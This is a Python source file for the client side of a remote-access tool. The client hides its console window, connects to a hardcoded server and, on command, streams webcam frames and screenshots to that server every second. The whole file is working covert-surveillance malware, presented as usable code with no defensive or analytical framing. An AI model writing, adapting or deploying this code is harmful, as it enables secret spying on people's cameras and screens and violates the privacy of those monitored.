import socket
import cv2
import threading
import requests
import os
import time
from PIL import ImageGrab
from io import BytesIO
import ctypes
import sys
import win32api
import pyautogui

# Function to hide the console window
def hide_console():
    if sys.platform == "win32":
        ctypes.windll.kernel32.FreeConsole()

# Connect to the server
SERVER_IP = "10.0.1.33"  # Replace with the server IP address
SERVER_PORT = 9999
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Send webcam feed to the server
def send_webcam():
    cap = cv2.VideoCapture(0)  # Open the default webcam
    while True:
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame)
            img_data = img_encoded.tobytes()
            client_socket.sendall(img_data)
        time.sleep(1)

# Send screen capture to the server
def send_screen():
    while True:
        screenshot = ImageGrab.grab()  # Capture the screen
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format="JPEG")
        img_data = img_byte_arr.getvalue()
        client_socket.sendall(img_data)
        time.sleep(1)

# Receive commands from the server
def receive_commands():
    while True:
        command = client_socket.recv(1024).decode()
        if not command:
            break
        print(f"Received Command: {command}")
        if command == "!webcam_stream":
            threading.Thread(target=send_webcam).start()
        elif command == "!screen_stream":
            threading.Thread(target=send_screen).start()

# Connect to the server and start receiving commands
def start_client():
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print("[+] Connected to the server.")
        threading.Thread(target=receive_commands).start()
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

# Main function to run the client
if __name__ == "__main__":
    hide_console()  # Hide the console window to run in the background
    start_client()
